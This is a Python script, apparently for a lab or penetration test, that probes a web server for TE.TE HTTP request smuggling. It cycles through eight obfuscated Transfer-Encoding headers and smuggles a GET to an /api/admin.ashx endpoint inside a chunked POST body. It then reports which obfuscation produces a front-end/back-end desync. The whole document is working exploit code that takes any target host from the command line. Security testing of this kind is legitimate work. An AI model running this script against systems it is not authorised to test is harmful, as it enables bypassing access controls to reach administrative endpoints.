#!/usr/bin/env python3
"""
TE.TE smuggling test — obfuscated Transfer-Encoding header.

Both front-end and back-end support TE: chunked, but one of them can be
tricked into ignoring an obfuscated variant. PortSwigger lists common
obfuscations; we cycle through them and report which one produces a
desync (next response on the connection looks wrong).
"""
import socket, sys
HOST, PORT = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("127.0.0.1", 8080)

OBFUSCATIONS = [
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
    "Transfer-Encoding: x\r\nTransfer-Encoding: chunked",
    "Transfer-Encoding:[tab]chunked".replace("[tab]", "\t"),
    " Transfer-Encoding: chunked",
    "X: X[lf]Transfer-Encoding: chunked".replace("[lf]", "\n"),
    "Transfer-Encoding\r\n: chunked",
]

def probe(te_header):
    body_smuggled = f"GET /api/admin.ashx HTTP/1.1\r\nHost: {HOST}\r\nFoo: "
    chunk = format(len(body_smuggled), "x")
    body = f"{chunk}\r\n{body_smuggled}\r\n0\r\n\r\n"
    req = (
        "POST /api/echo.ashx HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"{te_header}\r\n"
        "Content-Length: 4\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "\r\n"
        f"{body}"
    )
    s = socket.create_connection((HOST, PORT), timeout=4)
    s.sendall(req.encode())
    s.sendall(f"GET /api/echo.ashx HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n".encode())
    data = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            data += c
    except socket.timeout:
        pass
    s.close()
    return data.decode("latin1")

for ob in OBFUSCATIONS:
    print("=" * 60)
    print("[*] Trying:", ob.replace("\r", "\\r").replace("\n", "\\n").replace("\t", "\\t"))
    out = probe(ob)
    interesting = ("admin.ashx" in out) or ("400" in out and out.count("HTTP/1.1") < 2)
    print(out[:500])
    if interesting:
        print("[!] Possible TE.TE desync with this obfuscation.")
